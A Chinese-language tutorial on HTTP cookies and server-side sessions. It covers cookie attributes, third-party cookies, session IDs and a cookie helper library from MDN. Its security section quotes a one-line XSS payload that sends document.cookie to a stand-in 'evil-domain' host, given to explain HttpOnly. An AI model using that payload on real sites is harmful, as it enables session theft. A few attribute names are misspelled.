# session & cookie

> 网络早期最大的问题之一是如何管理状态。简而言之就是服务器无法知道两个请求是否来自同一个浏览器。

会话（`Session`）跟踪是`Web`程序中常用的技术，用来跟踪用户的整个会话。常用的会话跟踪技术是`Cookie`与`Session`。`Cookie`通过在客户端记录信息确定用户身份，`Session`通过在服务器端记录信息确定用户身份。

## `Cookie`

由于 `http` 是无状态的协议，一旦客户端和服务器的数据交换完毕，就会断开连接，再次请求，会重新连接，这就说明服务器单从网络连接上是没有办法知道用户身份的。为了解决这个问题，就给每次新的用户请求时，发一个身份证，每次访问都要带上身份证，这样服务器就知道是谁来访问了，针对不同的用户做出不同的响应。

主要用于以下三个方面：

- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）
- 浏览器行为跟踪（如跟踪分析用户行为等）

### 现状

`Cookie` 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，`Cookie` 渐渐被淘汰。由于服务器指定 `Cookie` 后，浏览器的每次请求都会携带 `Cookie` 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 `API` 已经允许开发者直接将数据存储到本地，如使用 `Web storage API` （本地存储和会话存储）或 `IndexedDB` 。

### 创建

当服务器收到 `http` 请求时，可以在响应头添加一个 `set-cookie`，浏览器收到响应后保存 `cookie`，之后每次请求服务器都会把 `cookie` 加入到请求头中传递给服务器

服务器设置的响应头：

```text
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry
```

浏览器保存 `cookie` 后发送的请求头：

```text
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

### 类型

按照生命周期分为两类：

- 会话 `Cookie`:是一种临时 `cookie` ，浏览器关闭自动刪除，仅在会话期有效
- 持久 `Cookie`:存放在硬盘中，由设置的有效期（`Max-Age`）或者过期时间（`Expires`）决定，通常是维护某个用户周期性访问服务器的配置文件或者登陆信息

### 属性

限制：

- `Secure`: 只能被 `https` 请求发送，预防 `man-in-the-middle` 攻击
- `HttpOnly`: 无法通过 `JavaScript api` 来获取，只能被服务器访问，预防 `XSS` 攻击

作用域：

- `Domain`: 指明哪些主机可以接受 `cookie`
- `Path`: 标识主机下哪些路径可以接受 `cookie`，子路径也会匹配
- `SameSite`: 允许服务器在跨站请求时不会被发送，预防 `CSRF`
  - `None`: 没有限制
  - `Strick`: 只在访问相同站点发送 `cookie`
  - `Lax`: 和上一个类似，但用户从外部站点导航过来时除外、

前缀：

- `_Host-`: 有 `Secure` 和 `Path` 设置时才接受
- `_Secure-`: 有 `Secure` 才接受

### 操作 `cookie`

`JavaScript` 通过 `docuemnt.cookie` 可以设置和获取 `Cookie` 的值

```JavaScript
document.cookie = "user=wang";
console.log(document.cookie);
```

禁止`javascript`操作`cookie`（为避免跨域脚本(`xss`)攻击，通过`javascript`的`document.cookie`无法访问带有`HttpOnly`标记的`cookie`）

```auto
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2017 07:28:00 GMT; Secure; HttpOnly
```

### 第三方 `cookie`

通常`cookie`的域和浏览器地址的域匹配，这被称为第一方`cookie`。那么第三方`cookie`就是`cookie`的域和地址栏中的域不匹配，这种`cookie`通常被用在第三方广告网站。为了跟踪用户的浏览记录，并且根据收集的用户的浏览习惯，给用户推送相关的广告。

### 安全

- `XSS`:`(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;`
  - 设置 `httpOnly` 阻止 `JavaScript` 读取 `cookie`
- `CSRF`: 点击一些不安全的论坛上的图片会向你的银行服务器发送提现请求，如果之前登录了银行账号而且 `Cookie` 有效，可能会有风险
  - 对于敏感 `cookie` 设置较短的生命周期

---

## `Session`

`Cookie`机制弥补了`HTTP`协议无状态的不足。在`Session`出现之前，基本上所有的网站都采用`Cookie`来跟踪会话。

与`Cookie`不同的是，`session`是以服务端保存状态的。

### 原理

当客户端请求创建一个`session`的时候，服务器会先检查这个客户端的请求里是否已包含了一个`session`标识 - `sessionId`，

- 如果已包含这个`sessionId`，则说明以前已经为此客户端创建过`session`，服务器就按照`sessionId`把这个`session`检索出来使用（如果检索不到，可能会新建一个）
- 如果客户端请求不包含`sessionId`，则为此客户端创建一个`session`并且生成一个与此`session`相关联的`sessionId`

`sessionId`的值一般是一个既不会重复，又不容易被仿造的字符串，这个`sessionId`将被在本次响应中返回给客户端保存。保存`sessionId`的方式大多情况下用的是`cookie`。

### 有效期

`session`一般在内存中存放，内存空间本身大小就有一定的局限性，因此`session`需要采用一种过期删除的机制来确保`session`信息不会一直累积，来防止内存溢出的发生。

`session`的超时时间可以通过`maxInactiveInterval`属性来设置。

### 注

实际上，有四种方式让`Session`正常工作

- 通过`URL`传递`SessionID`
- 通过`Cookie`传递`SessionID`
- 通过`SSL`传递`SessionID`
- 通过隐藏表单传递`SessionID`

---

## 区别和联系

|   差异   |          `cookie`          |       `session`        |
| :------: | :------------------------: | :--------------------: |
| 存储位置 |           客户端           |         服务器         |
| 数据类型 |           字符串           |          对象          |
| 访问权限 | 设置路径则某些地方不能访问 | 同一用户所有都可以访问 |

相同：

- 都是为了解决 `hhttp` 无状态的问题
- 都是基于 `cookie`

## 应用场景

- 重要状态使用 `session` ，例如用户登录信息
- 不重要的使用 `cookie` 例如购物车

## 封装 `cookie`

```js
/*\
|*|
|*|  :: cookies.js ::
|*|
|*|  A complete cookies reader/writer framework with full unicode support.
|*|
|*|  https://developer.mozilla.org/en-US/docs/DOM/document.cookie
|*|
|*|  This framework is released under the GNU Public License, version 3 or later.
|*|  http://www.gnu.org/licenses/gpl-3.0-standalone.html
|*|
|*|  Syntaxes:
|*|
|*|  * docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])
|*|  * docCookies.getItem(name)
|*|  * docCookies.removeItem(name[, path], domain)
|*|  * docCookies.hasItem(name)
|*|  * docCookies.keys()
|*|
\*/

var docCookies = {
  getItem: function(sKey) {
    return (
      decodeURIComponent(
        document.cookie.replace(
          new RegExp(
            "(?:(?:^|.*;)\\s*" +
              encodeURIComponent(sKey).replace(/[-.+*]/g, "\\$&") +
              "\\s*\\=\\s*([^;]*).*$)|^.*$"
          ),
          "$1"
        )
      ) || null
    );
  },
  setItem: function(sKey, sValue, vEnd, sPath, sDomain, bSecure) {
    if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) {
      return false;
    }
    var sExpires = "";
    if (vEnd) {
      switch (vEnd.constructor) {
        case Number:
          sExpires =
            vEnd === Infinity
              ? "; expires=Fri, 31 Dec 9999 23:59:59 GMT"
              : "; max-age=" + vEnd;
          break;
        case String:
          sExpires = "; expires=" + vEnd;
          break;
        case Date:
          sExpires = "; expires=" + vEnd.toUTCString();
          break;
      }
    }
    document.cookie =
      encodeURIComponent(sKey) +
      "=" +
      encodeURIComponent(sValue) +
      sExpires +
      (sDomain ? "; domain=" + sDomain : "") +
      (sPath ? "; path=" + sPath : "") +
      (bSecure ? "; secure" : "");
    return true;
  },
  removeItem: function(sKey, sPath, sDomain) {
    if (!sKey || !this.hasItem(sKey)) {
      return false;
    }
    document.cookie =
      encodeURIComponent(sKey) +
      "=; expires=Thu, 01 Jan 1970 00:00:00 GMT" +
      (sDomain ? "; domain=" + sDomain : "") +
      (sPath ? "; path=" + sPath : "");
    return true;
  },
  hasItem: function(sKey) {
    return new RegExp(
      "(?:^|;\\s*)" +
        encodeURIComponent(sKey).replace(/[-.+*]/g, "\\$&") +
        "\\s*\\="
    ).test(document.cookie);
  },
  keys: /* optional method: you can safely remove it! */ function() {
    var aKeys = document.cookie
      .replace(/((?:^|\s*;)[^\=]+)(?=;|$)|^\s*|\s*(?:\=[^;]*)?(?:\1|$)/g, "")
      .split(/\s*(?:\=[^;]*)?;\s*/);
    for (var nIdx = 0; nIdx < aKeys.length; nIdx++) {
      aKeys[nIdx] = decodeURIComponent(aKeys[nIdx]);
    }
    return aKeys;
  }
};
```
